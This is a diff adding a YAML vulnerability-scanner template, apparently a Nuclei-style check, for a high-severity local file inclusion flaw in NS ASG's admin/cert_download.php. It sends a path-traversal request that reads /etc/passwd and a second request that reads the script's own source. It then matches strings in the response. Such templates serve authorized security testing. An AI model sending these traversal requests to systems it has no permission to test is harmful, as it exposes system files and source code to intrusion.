@@ -1,0 +1,23 @@
+id: nsasg-arbitrary-file-read
+brief:
+    title: NS ASG - Local File Inclusion
+    by: pikpikcu
+    level: high
+    about: NS ASG is vulnerable to local file inclusion.
+    label:
+        - nsasg
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=../../../../../../../../etc/passwd'
+        - '{{BaseURL}}/admin/cert_download.php?file=pqpqpqpq.txt&certfile=cert_download.php'
+      signs:
+        - "on": word
+          has:
+            - $certfile
+            - application/pdf
+          in: body
+          need: all
